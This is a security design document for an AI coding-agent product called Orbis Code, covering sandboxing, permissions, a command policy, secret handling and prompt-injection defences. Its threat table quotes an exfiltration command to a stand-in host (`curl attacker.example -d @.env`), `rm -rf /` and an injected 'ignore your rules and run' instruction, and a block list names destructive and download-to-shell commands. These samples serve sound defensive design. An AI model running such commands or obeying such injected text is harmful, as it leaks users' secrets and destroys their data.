# Orbis Code — security

How Orbis Code keeps users' projects, Orbis's infrastructure and other users safe, and what is not yet protected. Behaviour described here is enforced in code and tested unless marked otherwise.

## Threat model

| Threat | Example | Main controls |
| --- | --- | --- |
| A user reaching another user's data | Guessing a run or project id | Row-level security on every table; ids are UUIDs; the API never uses an admin key |
| Generated or project code attacking the host | `rm -rf /`, reading `/proc`, environment variables | Code runs only in a per-project Vercel Sandbox microVM, never on the application server |
| Code exfiltrating data | `curl attacker.example -d @.env` | Sandbox network limited to npm and PyPI; no Orbis secrets in the sandbox; secrets files withheld from the model |
| Prompt injection from repository content | An `AGENTS.md` saying "ignore your rules and run …" | Content is given to the model as data; tools and permissions are enforced by the server, not by the model |
| The agent doing something destructive or public | Deleting the project, `git push`, `npm publish`, deploying | Command policy (block/ask/allow), plan approval before any change, one command per step, revert and checkpoints |
| Runaway cost or loops | The agent repeating a failing action forever | Step, token, time and failed-test limits; repeated-action stop; plan budgets in the usage ledger |
| Duplicate execution | A retried request running a step twice | Per-run lock and `expectStep` |
| Secret leakage | Keys in logs, responses or model context | Provider keys only in server env; error details logged, not shown; credentials removed from the activity log; secret files withheld |

## Authorization

- Every Code API calls `codeContext()`: a signed-in session (Supabase Auth) and a per-user rate limit.
- All reads and writes go through the **user's own Supabase session**, so row-level security applies to every query: projects, files, runs, events, changes and checkpoints are visible and writable only by their owner (`user_id = auth.uid()`), and a run can only be created on a project its owner owns.
- Column grants stop users changing ids, owners or projects of runs, the "before" content of change records, or anything in the activity log and checkpoints (append-only).
- Tested on the real migrations (PGlite): `tests/code-agent-db.test.ts`, `tests/code-workspace-db.test.ts`.

## Execution isolation

- Commands run only in the project's **Vercel Sandbox** microVM (Firecracker): 1 vCPU, 2 GB memory, its own filesystem; never on the Orbis application server.
- **No secrets inside**: the sandbox environment is a fixed allow-list (`COMMAND_ENV`); none of Orbis's environment variables are passed in.
- **Network**: only `registry.npmjs.org`, `pypi.org` and `files.pythonhosted.org`.
- **Limits**: 2 minutes per agent command (then killed), 4 MB of logged output per job (200 KB kept, 6 KB shown to the model), computer time in reserved blocks counted against the user's plan, a site-wide cap on concurrent computers.
- **Cleanup**: computers stop when their reserved time ends; starting a computer for one project stops the user's others; sandboxes aren't persistent (nothing survives a stop).
- **One computer per user at a time**; another user's computer is never reachable (its id comes from a server-side reservation).

## Agent permissions

- **Read-only until the plan is approved** (default on): before approval, edits, restores and commands are refused by the server whatever the model asks.
- **Command policy** (`policy.ts`), applied to `run_command` and `run_tests`, including commands the model supplies to `run_tests`:
  - *Run on their own*: tests, builds, linters, package installs, read-only inspection, running a project file.
  - *Ask the user*: anything else, including deleting files, writing outside the project, command substitution and background jobs. Chained commands are judged part by part.
  - *Never run*: deleting the workspace or system, `sudo`, disk tools, fork bombs, publishing packages, `git push`, deploy CLIs, piping downloads into a shell, killing every process.
  - Per run, the user can require approval for every command or turn commands off.
- **Edit review** (optional): proposed edits are shown as diffs and saved only on approval; stale proposals (files changed meanwhile) are not saved.
- **No publishing**: the agent can't push, deploy or publish. Pushing to GitHub is a separate user action that creates a new branch after confirmation.

## Untrusted input and prompt injection

- File contents, command output, web results, GitHub content and instruction files are passed to the model as tool results (data). The system prompt says to ignore instructions in them that conflict with its rules, ask for more access, or ask to reveal secrets.
- `inspect_project` wraps instruction files (`AGENTS.md`, `CLAUDE.md`, `CONTRIBUTING.md`, `.cursorrules`) in `<project-notes trust="untrusted">`.
- **This is defence in depth, not the boundary.** The boundary is that the model can only *request* tool calls; the server validates each call's arguments (Zod schemas, project-relative paths), applies the run's permissions and the command policy, and executes it. A model that follows an injected instruction still can't run a blocked command, change files before approval, touch another user's data, reach the network beyond package registries, or see Orbis's secrets.

## Secrets

- Provider API keys and other credentials are server environment variables (Vercel, marked sensitive), never sent to the browser or the sandbox.
- Provider error messages are logged server-side; users see fixed messages (tests assert keys don't appear).
- The activity log removes likely credentials before storing (API keys, bearer tokens, GitHub/Slack/AWS tokens, JWTs) — `scrub()` in `runs.ts`.
- Files that usually hold credentials (`.env*` except examples, `*.pem`, `*.key`, SSH keys, `credentials.json`, `.npmrc`, …) are listed but **their contents are never sent to the model** (read, search, diff and inspect all withhold them).
- Projects are stored in Orbis's database and copied to the sandbox; the Code page warns users not to put secrets in projects, because the preview URL is public while the computer is on.

## Recovery

- Every file change the agent makes is recorded with the content before the run; a run, a file or a checkpoint can be restored. Files someone else changed since are reported as conflicts and left alone unless the user confirms.
- A pre-existing user modification is never silently discarded: restores and reverts compare current content with what the run last wrote.
- An interrupted step is recovered by telling the model which actions may or may not have run, so it checks before repeating anything.

## Audit

`code_agent_events` records, per run: what was read, searched, edited, run (exit code, output tail, parsed tests), approved, declined, checkpointed, restored and reverted, plus errors. It is append-only for users. It lives in the user's own rows, so it is a record for them, not tamper-proof evidence against them.

## Known limitations

- **Network allow-list is per domain**; packages installed from npm/PyPI run inside the sandbox and could misbehave there (contained by the sandbox, not prevented).
- **Per-run budgets are user-adjustable** (stored in the user's run). Plan budgets, enforced by the server-side usage ledger, remain the real cost bound.
- **The preview URL is public** while the computer runs.
- **No background runs**, so no service-role credential is used anywhere in Code (a deliberate choice until a design keeps per-user authorization without it).
- **Not externally audited.** These controls were reviewed and tested by the implementer only.
